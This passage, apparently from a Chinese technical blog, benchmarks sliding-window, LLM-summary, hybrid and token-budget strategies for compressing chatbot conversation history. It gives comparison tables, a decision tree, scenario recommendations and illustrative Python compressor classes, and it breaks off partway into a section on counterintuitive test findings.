<table><thead><tr><th>维度</th><th>滑动窗口</th><th>LLM摘要</th><th>混合策略</th><th>Token动态</th></tr></thead><tbody><tr><td><strong>压缩后Token</strong></td><td><strong>145</strong> ⭐</td><td>597 ❌</td><td>604 ❌</td><td>193</td></tr><tr><td><strong>Token压缩率</strong></td><td><strong>74%</strong> ⭐</td><td>-7% ❌</td><td>-8% ❌</td><td>66%</td></tr><tr><td><strong>速度</strong></td><td><strong>0.00ms</strong> ⭐</td><td>13,446ms ❌</td><td>11,663ms ❌</td><td><strong>0.53ms</strong></td></tr><tr><td><strong>成本</strong></td><td><strong>$0</strong> ⭐</td><td>$0.0001</td><td>$0.0001</td><td><strong>$0</strong> ⭐</td></tr><tr><td><strong>信息保留</strong></td><td>0% ❌</td><td><strong>100%</strong> ⭐</td><td><strong>100%</strong> ⭐</td><td>依赖预算</td></tr><tr><td><strong>代码复杂度</strong></td><td>极简 ⭐</td><td>中等</td><td>高</td><td>低</td></tr></tbody></table>
<p><strong>关键发现：没有任何策略在所有维度都最优！</strong></p>
<hr/>
<h4 data-id="heading-73"><strong>详细对比表</strong></h4>
<p><strong>1. 性能指标对比</strong></p>








































<table><thead><tr><th>策略</th><th>短对话(5轮)</th><th>中等对话(10轮)</th><th>长对话(20轮)</th><th>超长对话(30轮)</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>126→126 (0%)</td><td>249→123 (51%)</td><td>560→145 (74%)</td><td>933→144 (85%)</td></tr><tr><td><strong>LLM摘要</strong></td><td>126→303 (-141%)</td><td>249→388 (-56%)</td><td>560→597 (-7%)</td><td>933→621 (33%)</td></tr><tr><td><strong>混合策略</strong></td><td>126→126 (0%)</td><td>249→123 (51%)</td><td>560→604 (-8%)</td><td>933→689 (26%)</td></tr><tr><td><strong>Token动态</strong></td><td>126→126 (0%)</td><td>249→194 (22%)</td><td>560→193 (66%)</td><td>933→191 (80%)</td></tr></tbody></table>
<p><strong>结论分析：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">短对话（≤<span class="hljs-number">5</span>轮）：
✅ 滑动窗口 = Token动态 = 混合策略
❌ LLM摘要（负优化，Token反增）

中等对话（<span class="hljs-number">10</span>轮）：
✅ 滑动窗口 = 混合策略（<span class="hljs-number">51</span><span class="hljs-comment">%压缩）</span>
⭕ Token动态（<span class="hljs-number">22</span><span class="hljs-comment">%压缩）</span>
❌ LLM摘要（负优化）

长对话（≥<span class="hljs-number">20</span>轮）：
✅ 滑动窗口（<span class="hljs-number">70</span>-<span class="hljs-number">85</span><span class="hljs-comment">%压缩）⭐</span>
⭕ Token动态（<span class="hljs-number">66</span>-<span class="hljs-number">80</span><span class="hljs-comment">%压缩）</span>
❌ LLM摘要、混合策略（负优化或低压缩）
</code></pre>
<hr/>
<p><strong>2. 速度对比</strong></p>








































<table><thead><tr><th>策略</th><th>短对话</th><th>中等对话</th><th>长对话</th><th>超长对话</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>0.00ms</td><td>0.00ms</td><td>0.00ms</td><td>0.01ms</td></tr><tr><td><strong>LLM摘要</strong></td><td>7,471ms</td><td>7,992ms</td><td>13,446ms</td><td>13,204ms</td></tr><tr><td><strong>混合策略</strong></td><td>0.01ms</td><td>0.01ms</td><td>11,663ms</td><td>14,809ms</td></tr><tr><td><strong>Token动态</strong></td><td>0.06ms</td><td>0.23ms</td><td>0.53ms</td><td>1.24ms</td></tr></tbody></table>
<p><strong>速度排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：0.00ms（基准）
<span class="hljs-bullet">2.</span> Token动态：0.38ms（慢，但&lt;1ms）
<span class="hljs-bullet">3.</span> LLM摘要：11,000ms（慢29,000倍）
<span class="hljs-bullet">4.</span> 混合策略：视场景（短对话0ms，长对话11,000ms）
</code></pre>
<hr/>
<p><strong>3. 成本对比</strong></p>








































<table><thead><tr><th>场景</th><th>滑动窗口</th><th>LLM摘要</th><th>混合策略</th><th>Token动态</th></tr></thead><tbody><tr><td>单次压缩</td><td>$0</td><td>$0.0001</td><td>$0-0.0001</td><td>$0</td></tr><tr><td>100次对话</td><td>$0</td><td>$0.01</td><td>$0.008</td><td>$0</td></tr><tr><td>日活10万</td><td>$0/天</td><td>$10/天</td><td>$8/天</td><td>$0/天</td></tr><tr><td>年成本</td><td><strong>$0</strong></td><td>$3,600</td><td>$2,880</td><td><strong>$0</strong></td></tr></tbody></table>
<p><strong>成本排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口、Token动态：$0 ⭐
<span class="hljs-bullet">2.</span> 混合策略：节省20% vs 纯LLM
<span class="hljs-bullet">3.</span> LLM摘要：最贵
</code></pre>
<hr/>
<p><strong>4. 信息保留对比</strong></p>
<p>测试场景：15轮对话，5个关键信息（Tom、28岁、上海、浦东、AI工程师）</p>



































<table><thead><tr><th>策略</th><th>保留率</th><th>详情</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td><strong>0%</strong> ❌</td><td>全部丢失</td></tr><tr><td><strong>LLM摘要</strong></td><td><strong>100%</strong> ✅</td><td>全部保留</td></tr><tr><td><strong>混合策略</strong></td><td><strong>100%</strong> ✅</td><td>全部保留（长对话时）</td></tr><tr><td><strong>Token动态(预算100)</strong></td><td><strong>40%</strong> ⚠️</td><td>仅保留部分</td></tr><tr><td><strong>Token动态(预算200)</strong></td><td><strong>100%</strong> ✅</td><td>全部保留</td></tr></tbody></table>
<p><strong>信息保留排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> LLM摘要、混合策略：100%（智能提取）
<span class="hljs-bullet">2.</span> Token动态：依赖预算（100→40%, 200→100%）
<span class="hljs-bullet">3.</span> 滑动窗口：0%（机械删除）
</code></pre>
<hr/>
<p><strong>5. 复杂度对比</strong></p>








































<table><thead><tr><th>策略</th><th>代码行数</th><th>配置项</th><th>调优难度</th><th>依赖</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>~10行</td><td>1个（轮数）</td><td>简单 ⭐</td><td>无</td></tr><tr><td><strong>Token动态</strong></td><td>~15行</td><td>1个（预算）</td><td>中等</td><td>Token计数器</td></tr><tr><td><strong>LLM摘要</strong></td><td>~30行</td><td>2个（轮数、Prompt）</td><td>中等</td><td>LLM API</td></tr><tr><td><strong>混合策略</strong></td><td>~50行</td><td>2个（阈值、轮数）</td><td>困难 ❌</td><td>以上全部</td></tr></tbody></table>
<p><strong>复杂度排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：最简单（3行核心代码）
<span class="hljs-bullet">2.</span> Token动态：简单（需设置预算）
<span class="hljs-bullet">3.</span> LLM摘要：中等（需Prompt工程）
<span class="hljs-bullet">4.</span> 混合策略：复杂（需调阈值，依赖多）
</code></pre>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e28c2d793bc041ff9fa03fa13ca6c485~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=mtXb74A12azpkLLGDKb5bvcDu00%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-74"><strong>优缺点矩阵</strong></h4>



































<table><thead><tr><th>策略</th><th>✅ 核心优势</th><th>❌ 核心劣势</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>• Token最少<br/>• 速度最快<br/>• 零成本<br/>• 极简实现</td><td>• 丢失所有早期信息<br/>• 不智能</td><td>短对话、成本敏感、实时场景</td></tr><tr><td><strong>LLM摘要</strong></td><td>• 100%信息保留<br/>• 智能提取</td><td>• 短对话负优化<br/>• 速度极慢<br/>• 有成本<br/>• 只在超长对话有效</td><td>超长对话（≥30轮）+ 需保留信息</td></tr><tr><td><strong>混合策略</strong></td><td>• 短对话=滑动窗口<br/>• 长对话保留信息<br/>• 自动切换</td><td>• 长对话Token多4-5倍<br/>• 速度慢<br/>• 有成本<br/>• 阈值难调</td><td>通用场景、用户体验优先</td></tr><tr><td><strong>Token动态</strong></td><td>• 精确控制Token<br/>• 速度快<br/>• 零成本<br/>• 充分利用预算</td><td>• Token比滑动窗口多33%<br/>• 信息保留靠预算<br/>• 预算难设置</td><td>有明确Token限制、消息长度差异大</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-75"><strong>场景推荐决策树</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">开始
 │
 ├─ 对话长度是否≤<span class="hljs-number">10</span>轮？
 │   ├─ 是 → 【滑动窗口】
 │   │        理由：简单、快速、零成本
 │   │
 │   └─ 否 → 是否需要保留用户信息？
 │       ├─ 否 → 【滑动窗口】
 │       │        理由：Token效率最高
 │       │
 │       └─ 是 → 有Token预算限制吗？
 │           ├─ 有 → 【Token动态】
 │           │        理由：精确控制预算
 │           │
 │           └─ 无 → 是否成本敏感？
 │               ├─ 是 → 【混合策略】
 │               │        理由：比纯LLM省<span class="hljs-number">20</span><span class="hljs-comment">%</span>
 │               │
 │               └─ 否 → 对话是否≥<span class="hljs-number">30</span>轮？
 │                   ├─ 是 → 【LLM摘要】
 │                   │        理由：唯一正收益场景
 │                   │
 │                   └─ 否 → 【混合策略】
 │                            理由：自动适应长度
</code></pre>
<hr/>
<h4 data-id="heading-76"><strong>分场景详细推荐</strong></h4>
<p><strong>场景1：FAQ机器人 / 快速问答</strong></p>
<pre><code class="hljs language-diff" lang="diff">特征：
<span class="hljs-deletion">- 对话：3-5轮</span>
<span class="hljs-deletion">- 消息：简短</span>
<span class="hljs-deletion">- 需求：快速响应</span>

推荐：滑动窗口 ⭐⭐⭐⭐⭐
理由：
✅ 对话短，不会丢失信息
✅ 速度最快
✅ 零成本
✅ 最简单

配置：
compressor = SlidingWindowCompressor(keep_turns=5)
</code></pre>
<hr/>
<p><strong>场景2：客服机器人 / 通用助手</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 对话：5-20轮不等
- 用户：需要记住背景
- 需求：体验 &gt; 成本

推荐：混合策略 ⭐⭐⭐⭐
理由：
✅ 短对话快速处理
✅ 长对话保留信息
✅ 自动适应
✅ 比纯LLM省20%成本

配置：
<span class="hljs-attr">compressor</span> = HybridCompressor(
    llm,
    <span class="hljs-attr">threshold_turns</span>=<span class="hljs-number">10</span>,
    <span class="hljs-attr">keep_recent_turns</span>=<span class="hljs-number">5</span>
)
</code></pre>
<hr/>
<p><strong>场景3：心理咨询 / 深度对话</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 对话：30-50轮
- 信息：密集、重要
- 需求：必须记住所有背景

推荐：LLM摘要 ⭐⭐⭐⭐
理由：
✅ 100%信息保留
✅ 智能提取关键信息
✅ 超长对话有正收益（33%压缩）

配置：
<span class="hljs-attr">compressor</span> = LLMSummaryCompressor(
    llm,
    <span class="hljs-attr">keep_recent_turns</span>=<span class="hljs-number">3</span>
)
</code></pre>
<hr/>
<p><strong>场景4：API网关 / Token严格限制</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 上下文：4K限制
- 消息：长度不一
- 需求：精确控制Token

推荐：Token动态 ⭐⭐⭐⭐⭐
理由：
✅ 精确控制（误差&lt;5%）
✅ 充分利用上下文
✅ 速度快
✅ 零成本

配置：
<span class="hljs-attr">compressor</span> = TokenBasedCompressor(
    llm.count_tokens,
    <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">200</span>
)
</code></pre>
<hr/>
<p><strong>场景5：大规模免费产品</strong></p>
<pre><code class="hljs language-diff" lang="diff">特征：
<span class="hljs-deletion">- 用户：百万级</span>
<span class="hljs-deletion">- 预算：极度敏感</span>
<span class="hljs-deletion">- 需求：成本最低</span>

推荐：滑动窗口 ⭐⭐⭐⭐⭐
理由：
✅ 零成本
✅ 最快
✅ Token最少
✅ 可扩展性最强

配置：
compressor = SlidingWindowCompressor(keep_turns=3)
# 保留更少轮数，进一步降低成本
</code></pre>
<hr/>
<p><strong>场景6：高端VIP服务</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 用户：付费用户
- 需求：完美体验
- 预算：充足

推荐：混合策略 ⭐⭐⭐⭐⭐
理由：
✅ 用户体验最佳
✅ 自动适应对话长度
✅ 成本可接受

配置：
<span class="hljs-attr">compressor</span> = HybridCompressor(
    llm,
    <span class="hljs-attr">threshold_turns</span>=<span class="hljs-number">8</span>,  <span class="hljs-comment"># 更早用LLM</span>
    <span class="hljs-attr">keep_recent_turns</span>=<span class="hljs-number">5</span>
)
</code></pre>
<hr/>
<p><strong>场景7：企业内部工具 / 复杂项目讨论</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 对话：20-40轮
- 信息：技术细节多
- 需求：不能丢失任何信息

推荐：LLM摘要 或 混合策略 ⭐⭐⭐⭐
理由：
✅ 保留所有技术细节
✅ 支持长时间讨论
✅ 内部工具，成本可控

配置：
<span class="hljs-comment"># 方案1：纯LLM摘要</span>
<span class="hljs-attr">compressor</span> = LLMSummaryCompressor(llm, keep_recent_turns=<span class="hljs-number">5</span>)

<span class="hljs-comment"># 方案2：混合策略</span>
<span class="hljs-attr">compressor</span> = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
</code></pre>
<hr/>
<p><strong>场景8：实时语音助手</strong></p>
<pre><code class="hljs language-diff" lang="diff">特征：
<span class="hljs-deletion">- 交互：实时语音</span>
<span class="hljs-deletion">- 延迟：&lt;100ms要求</span>
<span class="hljs-deletion">- 对话：5-10轮</span>

推荐：滑动窗口 ⭐⭐⭐⭐⭐
理由：
✅ 零延迟
✅ 对话不长，信息丢失风险低
✅ 最简单、最稳定

配置：
compressor = SlidingWindowCompressor(keep_turns=5)
</code></pre>
<hr/>
<h4 data-id="heading-77"><strong>组合策略推荐</strong></h4>
<p>有时单一策略无法满足需求，可以组合使用：</p>
<p><strong>组合1：混合策略 + 用户画像</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnhancedHybridCompressor</span>:
    <span class="hljs-string">"""混合策略 + 永久用户信息"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm</span>):
        self.hybrid = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
        self.user_profile = {}  <span class="hljs-comment"># 永久保存用户信息</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, user_id, messages</span>):
        <span class="hljs-comment"># 提取用户信息</span>
        self._extract_user_info(user_id, messages)
        
        <span class="hljs-comment"># 混合策略压缩</span>
        compressed = self.hybrid.compress(messages)
        
        <span class="hljs-comment"># 添加用户画像到开头</span>
        <span class="hljs-keyword">if</span> self.user_profile.get(user_id):
            profile_msg = {
                <span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>,
                <span class="hljs-string">"content"</span>: <span class="hljs-string">f"用户信息: <span class="hljs-subst">{self.user_profile[user_id]}</span>"</span>
            }
            compressed.insert(<span class="hljs-number">0</span>, profile_msg)
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>适用：个性化推荐、教育辅导</strong></p>
<hr/>
<p><strong>组合2：Token动态 + 关键信息提取</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartTokenCompressor</span>:
    <span class="hljs-string">"""Token动态 + 关键信息保护"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, max_tokens=<span class="hljs-number">200</span></span>):
        self.token_compressor = TokenBasedCompressor(
            llm.count_tokens, 
            max_tokens
        )
        self.key_entities = []  <span class="hljs-comment"># 关键实体</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 提取关键实体（姓名、地点等）</span>
        self._extract_entities(messages)
        
        <span class="hljs-comment"># Token动态压缩</span>
        compressed = self.token_compressor.compress(messages)
        
        <span class="hljs-comment"># 检查是否丢失关键实体</span>
        lost_entities = self._check_lost_entities(compressed)
        
        <span class="hljs-comment"># 如果丢失关键信息，放宽预算</span>
        <span class="hljs-keyword">if</span> lost_entities:
            self.token_compressor.max_tokens *= <span class="hljs-number">1.5</span>
            compressed = self.token_compressor.compress(messages)
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>适用：有Token限制但需保留关键信息</strong></p>
<hr/>
<p><strong>组合3：分级压缩</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TieredCompressor</span>:
    <span class="hljs-string">"""根据对话重要性分级压缩"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages, importance=<span class="hljs-string">"normal"</span></span>):
        <span class="hljs-keyword">if</span> importance == <span class="hljs-string">"critical"</span>:
            <span class="hljs-comment"># 重要对话：用LLM摘要</span>
            <span class="hljs-keyword">return</span> LLMSummaryCompressor(llm).compress(messages)
        <span class="hljs-keyword">elif</span> importance == <span class="hljs-string">"normal"</span>:
            <span class="hljs-comment"># 普通对话：用混合策略</span>
            <span class="hljs-keyword">return</span> HybridCompressor(llm).compress(messages)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 简单对话：用滑动窗口</span>
            <span class="hljs-keyword">return</span> SlidingWindowCompressor().compress(messages)
</code></pre>
<p><strong>适用：有明确优先级的场景</strong></p>
<hr/>
<h4 data-id="heading-78"><strong>快速选择指南</strong></h4>
<p><strong>按需求选择：</strong></p>
<pre><code class="hljs">需求                    → 推荐策略
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
成本最低               → 滑动窗口 / Token动态
速度最快               → 滑动窗口
Token最少              → 滑动窗口
精确控制Token          → Token动态
保留用户信息           → LLM摘要 / 混合策略
自动适应对话长度       → 混合策略
最简单实现             → 滑动窗口
生产通用方案           → 混合策略
</code></pre>
<p><strong>按对话特征选择：</strong></p>
<pre><code class="hljs">对话长度                → 推荐策略
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
≤5轮                   → 滑动窗口
5-10轮                 → 滑动窗口 / Token动态
10-20轮                → 混合策略 / Token动态
20-30轮                → 混合策略 / LLM摘要
≥30轮                  → LLM摘要
</code></pre>
<p><strong>按预算选择：</strong></p>
<pre><code class="hljs language-bash" lang="bash">预算情况                → 推荐策略
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
零预算                 → 滑动窗口 / Token动态
小预算(<span class="hljs-variable">$0</span>.01/次以内)   → 混合策略
预算充足               → LLM摘要
</code></pre>
<hr/>
<h4 data-id="heading-79"><strong>常见错误选择</strong></h4>
<p><strong>❌ 错误1：短对话用LLM摘要</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">场景：<span class="hljs-number">5</span>轮对话，<span class="hljs-number">126</span> tokens
选择：LLM摘要
结果：<span class="hljs-number">303</span> tokens（反增<span class="hljs-number">141</span><span class="hljs-comment">%）❌</span>

正确：滑动窗口 或 Token动态
原因：短对话不需要摘要，LLM反而啰嗦
</code></pre>
<hr/>
<p><strong>❌ 错误2：成本敏感场景用混合策略</strong></p>
<pre><code class="hljs language-bash" lang="bash">场景：日活10万，免费产品
选择：混合策略
结果：年成本<span class="hljs-variable">$2</span>,880 ❌

正确：滑动窗口
原因：零成本，可扩展性最好
</code></pre>
<hr/>
<p><strong>❌ 错误3：Token限制场景用滑动窗口</strong></p>
<pre><code class="hljs language-ini" lang="ini">场景：API限制4K tokens
选择：滑动窗口(10轮)
结果：有时10轮=150 tokens，有时=600 tokens ❌

正确：Token动态(<span class="hljs-attr">max_tokens</span>=<span class="hljs-number">200</span>)
原因：精确控制，不会超限
</code></pre>
<hr/>
<p><strong>❌ 错误4：实时场景用LLM摘要</strong></p>
<pre><code class="hljs">场景：语音助手，延迟&lt;100ms
选择：LLM摘要
结果：压缩耗时11秒，体验极差 ❌

正确：滑动窗口
原因：零延迟
</code></pre>
<hr/>
<p><strong>❌ 错误5：长对话只用滑动窗口</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">场景：30轮心理咨询
选择：滑动窗口(5轮)
结果：丢失所有早期背景 ❌
<span class="hljs-code">      用户需要重复说明
</span>
正确：LLM摘要 或 混合策略
原因：保留用户信息，体验更好
</code></pre>
<hr/>
<h4 data-id="heading-80"><strong>实战建议</strong></h4>
<p><strong>1. 从简单开始</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 第一步：先用滑动窗口</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)

<span class="hljs-comment"># 运行一段时间，观察问题：</span>
<span class="hljs-comment"># - 用户是否抱怨"不记得之前说的"？</span>
<span class="hljs-comment"># - 对话是否经常超过10轮？</span>

<span class="hljs-comment"># 如果是，再升级到混合策略</span>
</code></pre>
<p><strong>2. A/B测试</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 对照组：滑动窗口</span>
group_a = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)

<span class="hljs-comment"># 实验组：混合策略</span>
group_b = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)

<span class="hljs-comment"># 观察指标：</span>
<span class="hljs-comment"># - 用户满意度</span>
<span class="hljs-comment"># - 对话完成率</span>
<span class="hljs-comment"># - 重复提问率</span>
<span class="hljs-comment"># - Token成本</span>
</code></pre>
<p><strong>3. 监控关键指标</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MonitoredCompressor</span>:
    <span class="hljs-string">"""带监控的压缩器"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        start = time.time()
        
        original_tokens = self._count_tokens(messages)
        result = self.compressor.compress(messages)
        compressed_tokens = self._count_tokens(result)
        
        elapsed = time.time() - start
        
        <span class="hljs-comment"># 记录指标</span>
        metrics.record({
            <span class="hljs-string">"original_tokens"</span>: original_tokens,
            <span class="hljs-string">"compressed_tokens"</span>: compressed_tokens,
            <span class="hljs-string">"compression_rate"</span>: <span class="hljs-number">1</span> - compressed_tokens/original_tokens,
            <span class="hljs-string">"latency_ms"</span>: elapsed * <span class="hljs-number">1000</span>,
            <span class="hljs-string">"strategy"</span>: self.compressor.__class__.__name__
        })
        
        <span class="hljs-keyword">return</span> result
</code></pre>
<p><strong>4. 动态切换策略</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveCompressor</span>:
    <span class="hljs-string">"""根据实时情况动态选择策略"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 检查系统负载</span>
        <span class="hljs-keyword">if</span> system_load &gt; <span class="hljs-number">0.8</span>:
            <span class="hljs-comment"># 高负载：用最快的</span>
            <span class="hljs-keyword">return</span> SlidingWindowCompressor().compress(messages)
        
        <span class="hljs-comment"># 检查对话长度</span>
        turns = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        <span class="hljs-keyword">if</span> turns &lt;= <span class="hljs-number">10</span>:
            <span class="hljs-keyword">return</span> SlidingWindowCompressor().compress(messages)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> HybridCompressor(llm).compress(messages)
</code></pre>
<hr/>
<h4 data-id="heading-81"><strong>总结：没有银弹</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">核心教训：
❌ 没有<span class="hljs-string">"最好"</span>的策略
✅ 只有<span class="hljs-string">"最适合"</span>的策略

选择依据：
<span class="hljs-number">1</span>. 对话特征（长度、密度）
<span class="hljs-number">2</span>. 业务需求（成本、体验）
<span class="hljs-number">3</span>. 技术约束（延迟、Token限制）

实用建议：
• <span class="hljs-number">80</span><span class="hljs-comment">%场景：滑动窗口 或 混合策略</span>
• <span class="hljs-number">10</span><span class="hljs-comment">%场景：Token动态</span>
• <span class="hljs-number">10</span><span class="hljs-comment">%场景：LLM摘要</span>

核心原则：
从简单开始 → 测试验证 → 按需升级
</code></pre>
<h2 data-id="heading-82"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df584483d97446c9ba00c68cdcdc4d9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=6NH6AeDbh8vyJp9HAKDK9LN%2B684%3D" alt="image.png" loading="lazy"/></h2>
<h2 data-id="heading-83"><strong>四、性能测试中的意外发现</strong></h2>
<p>在完成所有测试后，我们发现了一些<strong>反直觉</strong>的结果。这些发现改变了我们对"好策略"的认知。</p>
<h3 data-id="heading-84"><strong>4.1 意外1：LLM摘要在短对话中是"负优化"</strong></h3>
<h4 data-id="heading-85"><strong>直觉预期</strong></h4>
<pre><code class="hljs">LLM很智能 → 压缩效果应该最好
智能摘要 → Token肯定比原始少
</code></pre>
<h4 data-id="heading-86"><strong>实测数据</strong></h4>
<p><strong>短对话（5轮，126 tokens）：</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">原始对话：
<span class="hljs-symbol">User:</span> <span class="hljs-string">"我叫Tom"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"你好Tom！"</span>
<span class="hljs-symbol">User:</span> <span class="hljs-string">"我在上海"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"上海很不错"</span>
<span class="hljs-symbol">User:</span> <span class="hljs-string">"谢谢"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"不客气"</span>

总计：<span class="hljs-number">126</span> tokens
</code></pre>
<p><strong>LLM摘要后：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">📝 对话历史摘要：

<span class="hljs-strong">**用户基本信息**</span>
<span class="hljs-bullet">-</span> 姓名：Tom
<span class="hljs-bullet">-</span> 地点：上海
<span class="hljs-bullet">-</span> 职业：未明确说明

<span class="hljs-strong">**用户偏好和兴趣**</span>
<span class="hljs-bullet">-</span> 未提及具体偏好

<span class="hljs-strong">**讨论主要话题**</span>
<span class="hljs-bullet">1.</span> 用户自我介绍（姓名、地点）
<span class="hljs-bullet">2.</span> 简单寒暄

<span class="hljs-strong">**关键细节**</span>
<span class="hljs-bullet">-</span> 用户表达了感谢

总计：303 tokens（增加141%！）
</code></pre>
<p><strong>结果对比：</strong></p>



































<table><thead><tr><th>对话长度</th><th>原始Token</th><th>LLM摘要后</th><th>变化</th></tr></thead><tbody><tr><td>5轮</td><td>126</td><td>303</td><td><strong>+141%</strong> ❌</td></tr><tr><td>10轮</td><td>249</td><td>388</td><td><strong>+56%</strong> ❌</td></tr><tr><td>20轮</td><td>560</td><td>597</td><td><strong>+7%</strong> ❌</td></tr><tr><td>30轮</td><td>933</td><td>621</td><td><strong>-33%</strong> ✅</td></tr></tbody></table>
<p><strong>震惊的发现：只有≥30轮时，LLM摘要才有正收益！</strong></p>
<hr/>
<h4 data-id="heading-87"><strong>为什么会这样？</strong></h4>
<p><strong>原因1：格式化文本的开销</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 我们的Prompt要求</span>
<span class="hljs-string">"请按以下格式输出摘要：
📝 对话历史摘要：
1. **用户基本信息**：...
2. **用户偏好与兴趣**：...
..."</span>

<span class="hljs-comment"># 这些格式文本本身就消耗Token</span>
格式开销：~<span class="hljs-number">100</span> tokens
</code></pre>
<p><strong>原因2：LLM天生"啰嗦"</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">原始：<span class="hljs-string">"我叫Tom"</span>（<span class="hljs-number">3</span> tokens）

LLM摘要：<span class="hljs-string">"用户的姓名是Tom"</span>（<span class="hljs-number">7</span> tokens）
→ 反而更多！
</code></pre>
<p><strong>原因3：短对话本身已经很简洁</strong></p>
<pre><code class="hljs language-diff" lang="diff">短对话特点：
<span class="hljs-deletion">- 用户说话简短："嗯"、"好的"</span>
<span class="hljs-deletion">- 没有冗余信息</span>
<span class="hljs-deletion">- 本身就是"压缩"过的</span>

LLM摘要：
<span class="hljs-deletion">- 需要完整描述上下文</span>
<span class="hljs-deletion">- 必须保持语义清晰</span>
<span class="hljs-deletion">- 结果反而更长</span>
</code></pre>
<hr/>
<h4 data-id="heading-88"><strong>教训</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">❌ 错误想法：LLM很智能 → 一定比简单策略好
✅ 正确认知：智能不等于高效，要看具体场景

启示：
• 不要在短对话（&lt;<span class="hljs-number">20</span>轮）使用LLM摘要
• 简单场景用简单方案（滑动窗口）
• <span class="hljs-string">"智能"</span>不是万能的
</code></pre>
<h2 data-id="heading-89"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6b06ea7ef964e4090529d9ab8596c52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=RoLfvQvyFFocquLJE1Hdf7ofMwo%3D" alt="image.png" loading="lazy"/></h2>
<h3 data-id="heading-90"><strong>4.2 意外2：混合策略在长对话时Token效率反而很差</strong></h3>
<h4 data-id="heading-91"><strong>直觉预期</strong></h4>
<pre><code class="hljs">混合策略 = 最佳策略
短对话用滑动窗口（快）+ 长对话用LLM（智能）
→ 应该综合了两者优点
